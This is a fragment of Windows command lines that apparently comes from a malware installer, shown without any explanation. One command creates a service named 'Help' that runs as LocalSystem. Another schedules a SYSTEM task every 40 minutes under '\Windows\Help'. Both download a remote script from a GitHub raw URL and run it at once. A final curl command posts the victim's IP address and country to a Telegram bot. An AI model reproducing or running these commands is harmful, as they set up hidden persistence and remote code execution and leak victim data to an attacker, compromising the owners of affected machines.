...
sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/1/run.ps1 ^| iex" start="auto" obj="LocalSystem"
schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /Q /V:ON" /F
...
%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=RUC%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
